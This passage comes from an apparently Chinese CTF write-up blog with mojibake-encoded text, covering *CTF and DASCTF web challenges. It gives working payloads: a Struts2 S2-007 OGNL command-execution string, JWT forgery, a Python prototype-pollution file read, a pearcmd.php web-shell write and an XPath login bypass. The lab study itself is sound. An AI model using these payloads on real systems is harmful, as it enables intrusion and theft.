class="line"></span><br></pre></td></tr></table></figure></li><li><p>æ ¹æ®æºç ï¼Œå¯ä»¥çŸ¥é“<code>salt</code>é•¿åº¦ä¸º14ï¼Œå¸¸è§„åšæ³•æ˜¯æŠŠ<code>salt</code>çˆ†ç ´å‡ºæ¥ã€‚å¯ä»¥åˆ©ç”¨  <a href="https://blog.csdn.net/qq_45290991/article/details/120400363">hashé•¿åº¦æ‹“å±•æ”»å‡»</a> æ¥ç»•è¿‡éªŒè¯ï¼Œä»è€Œå¾—åˆ°<code>secret_key</code>ã€‚</p></li><li><p>åˆ©ç”¨<code>hashpump</code>ç”Ÿæˆæ–°çš„<code>MD5</code>å’Œ<code>password</code>ã€‚</p><p><img src="/%E2%80%BBCTF/%E4%B8%80.1.2.png"></p></li><li><p>æŠŠ<code>\x</code>æ¢æˆ<code>%</code>ï¼Œç”¨bpå‘é€è¿‡å»ï¼Œå³å¯å¾—åˆ°<code>secret_key</code>ã€‚ã€</p><p><img src="/%E2%80%BBCTF/%E4%B8%80.1.3.png"></p></li><li><p>å›åˆ°å¼€å§‹çš„é¡µé¢ï¼Œå¼€å§‹ä¼ªé€ <code>jwt</code>ã€‚æ‹¿åˆ°cookieï¼Œå» jwt.io å°†useræ”¹æˆadminã€‚</p><p><img src="/%E2%80%BBCTF/%E4%B8%80.1.4.png"></p></li><li><p>å°†<code>access_token</code>çš„å€¼æ”¹æˆæ–°ä¼ªé€ å¥½çš„å€¼ï¼Œå³å¯è¿›å…¥ä¸‹é¢è¿™ä¸ªé¡µé¢ã€‚</p><p>â€‹<img src="/%E2%80%BBCTF/%E4%B8%80.1.5.png"></p></li><li><p>æ ¹æ®é¢˜ç›®åç§°ï¼Œå‰é¢æ˜¯jwtäº†ï¼Œé‚£ä¹ˆåé¢æ˜¯struts2ï¼Œæºç ä¸­ä¹Ÿæœ‰æç¤ºã€‚</p></li><li><p>ç»è¿‡æµ‹è¯•ï¼Œæ˜¯<code>S2-007</code>ï¼Œ <a href="https://blog.csdn.net/q20010619/article/details/120729447">ctfshow web281-S2-007</a> ã€‚</p><p>æ‰§è¡Œä»»æ„ä»£ç poc:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())) + &#x27;</span><br></pre></td></tr></table></figure><p>ä¼ å…¥åå³å¯æ‰§è¡Œ<code>id</code>å¹¶å›æ˜¾ã€‚</p><p><img src="/%E2%80%BBCTF/%E4%B8%80.1.6.png"></p></li><li><p>æ‰§è¡Œå‘½ä»¤<code>env</code>æŸ¥çœ‹ç¯å¢ƒå˜é‡ï¼Œå³å¯å¾—åˆ°flagã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;env&#x27;).getInputStream())) + &#x27;</span><br></pre></td></tr></table></figure><p><img src="/%E2%80%BBCTF/%E4%B8%80.1.7.png"></p></li></ol><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="snippingTools"><a href="#snippingTools" class="headerlink" title="snippingTools"></a>snippingTools</h2><ol><li><p>é¢˜ç›®æè¿°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Aliceåœ¨å‚åŠ æŸä¸ªCTFæ¯”èµ›ï¼Œå¥¹æˆåŠŸçš„è§£å‡ºäº†ä¸€é“é¢˜ï¼Œæ‹¿åˆ°äº†flagã€‚å¥¹å¾ˆå¼€å¿ƒï¼Œè¿«ä¸åŠå¾…åœ°æƒ³è¦å‘Bobåˆ†äº«å¥¹çš„å–œæ‚¦ã€‚äºæ˜¯æŒ‰ä¸‹äº†å¿«æ·é”®Shift+Win+Sä½¿ç”¨äº†Windows 11çš„æˆªå›¾å·¥å…·ï¼Œæˆªå–äº†æ•´ä¸ªå±å¹•ï¼Œå¹¶ä¸”ä¿å­˜ä¸ºæ–‡ä»¶1.pngã€‚ç„¶åï¼Œè€ƒè™‘åˆ°æ¯”èµ›è§„åˆ™ä¸­è§„å®šflagéœ€è¦ä¿å¯†ï¼Œå¥¹ä½¿ç”¨äº†æˆªå›¾å·¥å…·ä¸­çš„â€œè£å‰ªâ€åŠŸèƒ½ï¼Œå°†flagè£å‰ªæ‰äº†ä¸€éƒ¨åˆ†ï¼Œç„¶åå°†è£å‰ªç»“æœè¦†ç›–äº†åŸæ–‡ä»¶1.pngå¹¶ä¿å­˜ã€‚æœ€ç»ˆï¼Œå¥¹å°†1.pngå‘ç»™äº†Bobã€‚Bobé©¬ä¸Šå°±çŸ¥é“äº†å¥¹çš„æ•´ä¸ªflagï¼Œä½ çŸ¥é“æ˜¯å¦‚ä½•åšåˆ°çš„å—ï¼Ÿ</span><br></pre></td></tr></table></figure></li><li><p>é¢˜ç›®é™„ä»¶ï¼š</p><p><img src="/%E2%80%BBCTF/1.png"></p></li><li><p>ç”¨å¿…åº”æœç´¢ä¸€ä¸‹ï¼Œå‘ç°æœ‰cveï¼Œå¾—åˆ°cveç¼–å·ä¸º<code>CVE-2023-28303</code>ã€‚</p><p><img src="/%E2%80%BBCTF/misc.1.3.png"></p></li><li><p>åœ¨githubä¸Šæœç´¢æ˜¯å¦æœ‰å¯ç”¨å·¥å…·ï¼Œæœç´¢åˆ°äº†<a href="https://github.com/frankthetank-music/Acropalypse-Multi-Tool">è¿™ä¸ªå·¥å…·</a>ï¼Œåè¾¹æ˜¯åˆ©ç”¨è¿™ä¸ªå·¥å…·è¿˜åŸå›¾ç‰‡ã€‚</p><p><img src="/%E2%80%BBCTF/misc.1.1.png"></p><p><img src="/%E2%80%BBCTF/misc.1.2.png"></p></li></ol><h2 id="old-language"><a href="#old-language" class="headerlink" title="old language"></a>old language</h2><ol><li><p>é™„ä»¶ï¼š</p><p><img src="/%E2%80%BBCTF/task.png"></p></li><li><p>ä¾ç…§ <a href="https://ja.fonts2u.com/dovahkiin.%E3%83%95%E3%82%A9%E3%83%B3%E3%83%88">è¿™ä¸ªç½‘ç«™</a> ä¸Šçš„å†…å®¹ï¼Œå¯¹åº”å›¾ç‰‡ä¸Šçš„å›¾æ¡ˆï¼Œå³å¯å¾—åˆ°flagä¸º<code>gikrvzy</code></p><p><img src="/%E2%80%BBCTF/misc.2.1.png"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write up </tag>
            
            <tag> WEB </tag>
            
            <tag> *CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF</title>
      <link href="/DASCTF/"/>
      <url>/DASCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="EzFlask"><a href="#EzFlask" class="headerlink" title="EzFlask"></a>EzFlask</h2><ol><li><p>æºç </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> black_list</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">user</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username = <span class="string">&quot;&quot;</span></span><br><span class="line">        self.password = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> self.username == data[<span class="string">&#x27;username&#x27;</span>] <span class="keyword">and</span> self.password == data[<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">Users = []</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> check(request.data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            User = user()</span><br><span class="line">            merge(data, User)</span><br><span class="line">            Users.append(User)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Success&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">            <span class="keyword">for</span> user <span class="keyword">in</span> Users:</span><br><span class="line">                <span class="keyword">if</span> user.check(data):</span><br><span class="line">                    session[<span class="string">&quot;username&quot;</span>] = data[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Login Success&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5010</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>å®¡è®¡å‘ç°æœ‰è¿™ä¸ªå‡½æ•°</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç™¾åº¦åå¾—çŸ¥è¿™æ˜¯pythonçš„åŸå‹é“¾æ±¡æŸ“ã€‚</p></li><li><p>é€šè¿‡åˆ†æï¼Œæˆ‘ä»¬çš„ç›®çš„æ˜¯é€šè¿‡<code>/register</code>è·¯ç”±æ±¡æŸ“<code>__file__</code>å˜é‡ï¼Œä»è€Œå®ç°åœ¨<code>/</code>è·¯ç”±ä¸‹çš„æ–‡ä»¶ä»»æ„è¯»å–ã€‚</p></li><li><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://www.cnblogs.com/Article-kelp/p/17068716.html">https://www.cnblogs.com/Article-kelp/p/17068716.html</a></p></li><li><p>å­¦ä¹ è¿‡ç¨‹ä¸­å‘ç°ï¼Œéœ€è¦<code>__init__</code>æ¥å®ç°å…¨å±€å˜é‡çš„æ±¡æŸ“ï¼Œä½†æµ‹è¯•å‘ç°<code>__init__</code>è¢«è¿‡æ»¤äº†ã€‚</p></li><li><p>é€šè¿‡Unicodeç¼–ç <code>__init__</code>ï¼Œå®ç°äº†<code>__file__</code>çš„æ±¡æŸ“ã€‚</p><p>payload:</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;123&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;123&quot;</span><span class="punctuation">,</span><span class="attr">&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;__file__&quot;</span><span class="punctuation">:</span><span class="string">&quot;/proc/1/environ&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="ez-cms"><a href="#ez-cms" class="headerlink" title="ez_cms"></a>ez_cms</h2><ol><li><p>æ‰“å¼€ç¯å¢ƒï¼Œä¿¡æ¯æ”¶é›†å¾—åˆ°è¿™ä¸ªcmsæ˜¯<code>ç†Šæµ·cms V1.0</code>ã€‚</p></li><li><p>ç™¾åº¦è¿™ä¸ªcmsçš„æ¼æ´ï¼Œå¾—åˆ°å‡ ä¸ªæ¼æ´ï¼Œåˆ†åˆ«æ˜¯sqlæ³¨å…¥ï¼Œæ–‡ä»¶åŒ…å«ï¼Œæ–‡ä»¶ä¸Šä¼ ï¼Œæ–‡ä»¶ä»»æ„ä¸‹è½½ï¼Œåå°è®¤è¯ç»•è¿‡ã€‚</p></li><li><p>å°è¯•sqlæ³¨å…¥ï¼Œç”¨sqlmapä¸€æŠŠæ¢­ï¼Œæ²¡æ‰¾åˆ°flagï¼Œå°è¯•æ—¥å¿—å†™é©¬ï¼Œå‘ç°ä¸è¡Œã€‚</p></li><li><p>å°è¯•æ–‡ä»¶ä¸Šä¼ ï¼Œå‘ç°ä¸èƒ½ä¸Šä¼ ä»»ä½•æ–‡ä»¶ã€‚</p></li><li><p>å°è¯•æ–‡ä»¶ä»»æ„ä¸‹è½½ï¼Œè®¿é—®&#x2F;adminï¼Œç”¨<code>admin:123456</code>ç™»å½•è¿›åå°ï¼Œé€‰æ‹©<code>å†…å®¹ç®¡ç†--ä¸‹è½½åˆ—è¡¨</code>ï¼Œç‚¹é‚£ä¸ªğŸ–Šçš„å›¾æ ‡ï¼Œè¿›å…¥ä¿®æ”¹é¡µé¢ã€‚</p><p><img src="/DASCTF/ez_cms1.png"></p></li><li><p>åœ¨ä¿®æ”¹é¡µé¢çš„æ–‡ä»¶ä½ç½®å¡«ä¸Šæ–‡ä»¶çš„è·¯å¾„ï¼Œç„¶åç‚¹å‡»ä¿å­˜ã€‚</p><p><img src="/DASCTF/ez_cms2.png"></p></li><li><p>è¿”å›ä¸€å¼€å§‹çš„é¡µé¢ï¼Œç‚¹ğŸ–Šæ—è¾¹çš„ âˆš è¿›å…¥ä¸‹è½½é¡µé¢ï¼Œç„¶åç‚¹å‡»è”é€šä¸‹è½½ï¼Œå³å¯ä»»æ„ä¸‹è½½æ–‡ä»¶ã€‚</p><p><img src="/DASCTF/ez_cms3.png"></p></li><li><p>å‘ç°è¿™é‡Œåªèƒ½ä¸‹è½½æ–‡ä»¶ï¼Œä½†ä¸çŸ¥é“flagåœ¨å“ªä¸ªæ–‡ä»¶ï¼Œåªèƒ½æ”¾å¼ƒã€‚</p></li><li><p>æ–‡ä»¶åŒ…å«åŠŸèƒ½ï¼Œç”¨ä¸Šé¢çš„æ–‡ä»¶ä»»æ„ä¸‹è½½index.phpçš„æºç ã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//å•ä¸€å…¥å£æ¨¡å¼</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); <span class="comment">//å…³é—­é”™è¯¯æ˜¾ç¤º</span></span><br><span class="line"><span class="variable">$file</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]); <span class="comment">//æ¥æ”¶æ–‡ä»¶å</span></span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$file</span>==<span class="string">&#x27;&#x27;</span>?<span class="string">&#x27;index&#x27;</span>:<span class="variable">$file</span>; <span class="comment">//åˆ¤æ–­ä¸ºç©ºæˆ–è€…ç­‰äºindex</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;files/&#x27;</span>.<span class="variable">$action</span>.<span class="string">&#x27;.php&#x27;</span>); <span class="comment">//è½½å…¥ç›¸åº”æ–‡ä»¶</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>åˆ†æå¾—çŸ¥ï¼Œä½¿ç”¨äº†<code>addslashes</code>åšäº†è¿‡æ»¤ï¼Œå› æ­¤æ— æ³•ä½¿ç”¨ä¼ªåè®®ï¼Œè€Œä¸”åŒ…å«çš„æ—¶å€™æ‹¼æ¥äº†<code>.php</code>ï¼Œä¹Ÿæ²¡åŠæ³•ç»•è¿‡ã€‚</p></li><li><p>ä½¿ç”¨<code>pearcmd.php</code>è¿›è¡Œæ–‡ä»¶åŒ…å«ã€‚ï¼ˆå‚è€ƒé“¾æ¥ï¼š<a href="https://blog.csdn.net/JCPS_Y/article/details/127541665%EF%BC%89">https://blog.csdn.net/JCPS_Y/article/details/127541665ï¼‰</a></p></li><li><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?+config-create+/&amp;r=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[1])?&gt;+/tmp/hello.php</span><br></pre></td></tr></table></figure></li><li><p>å°è¯•è¿‡ç¨‹ä¸­å‘ç°ä¸€ç›´æ²¡æœ‰æˆåŠŸï¼ŒçŒœæµ‹phpçš„è·¯å¾„ä¸å¯¹ã€‚</p></li><li><p>æƒ³åˆ°é¢˜ç›®ç¯å¢ƒæ˜¯ç”¨<code>doctor</code>æ­çš„ï¼Œæ˜¯ä¸æ˜¯å®ƒä»¬çš„phpè·¯å¾„ä¸ä¸€æ ·å‘¢ï¼Ÿäºæ˜¯å»æ‰“å¼€ä¸ª<code>doctor</code>å»å°è¯•ä¸€ä¸‹ï¼Œå‘ç°æœç„¶ä¸ä¸€æ ·ã€‚</p><p><img src="/DASCTF/ez_cms4.png"></p></li><li><p>äºæ˜¯ä¿®æ”¹è·¯å¾„ä¸º<code>/usr/share/php/pearcmd</code>ï¼Œå†æ¬¡å°è¯•ï¼Œå‘ç°æˆåŠŸäº†ã€‚</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?+config-create+/&amp;r=../../../../../../../../../../../usr/share/php/pearcmd&amp;/&lt;?=@eval($_POST[1])?&gt;+/tmp/hello.php</span><br></pre></td></tr></table></figure><p><img src="/DASCTF/ez_cms5.png"></p></li><li><p>æœ€åç”¨råŒ…å«<code>/tmp/hello,php</code>ï¼Œå³å¯å®ç°rceã€‚</p><p><img src="/DASCTF/ez_cms6.png"></p></li><li><p>æœ€å<code>cat /flag_you_find_ya</code>ï¼Œå³å¯å¾—åˆ°flagã€‚</p><p><img src="/DASCTF/ez_cms7.png"></p></li></ol><h2 id="MyPicDisk"><a href="#MyPicDisk" class="headerlink" title="MyPicDisk"></a>MyPicDisk</h2><ol><li><p>ä¸‡èƒ½å¯†ç ç™»å½•ï¼Œå‘ç°ç™»å½•æˆåŠŸï¼Œå†æ¬¡ç™»å½•ä¸€æ¬¡ï¼Œå¯ä»¥åœ¨æºç ä¸­çœ‹åˆ°æç¤ºã€‚(payload:<code>username=admin&#39;or 1=1 #</code>)</p><p><img src="/DASCTF/My1.png"></p></li><li><p>ä¸‹è½½å¾—åˆ°index.phpçš„æºç ã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FILE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lasttime</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\//i&quot;</span>, <span class="variable">$filename</span>))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$num</span> = <span class="title function_ invoke__">substr_count</span>(<span class="variable">$filename</span>, <span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$num</span> != <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;???&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">filesize</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;lasttime = <span class="title function_ invoke__">filemtime</span>(<span class="variable">$filename</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">remove</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Filename: &quot;</span>. <span class="variable language_">$this</span>-&gt;filename. <span class="string">&quot;  Last Modified Time: &quot;</span>.<span class="variable language_">$this</span>-&gt;lasttime. <span class="string">&quot;  Filesize: &quot;</span>.<span class="variable language_">$this</span>-&gt;size.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls -all &quot;</span>.<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">  &lt;title&gt;MyPicDisk&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;form method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">    usernameï¼š&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    passwordï¼š&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;submit&quot; value=&quot;ç™»å½•&quot; name=&quot;submit&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line">  <span class="variable">$xml</span> = <span class="title function_ invoke__">simplexml_load_file</span>(<span class="string">&#x27;/tmp/secret.xml&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$x_query</span>=<span class="string">&quot;/accounts/user[username=&#x27;<span class="subst">&#123;$username&#125;</span>&#x27; and password=&#x27;<span class="subst">&#123;$password&#125;</span>&#x27;]&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$xml</span>-&gt;<span class="title function_ invoke__">xpath</span>(<span class="variable">$x_query</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$result</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;ç™»å½•å¤±è´¥&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;ç™»å½•æˆåŠŸ!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span 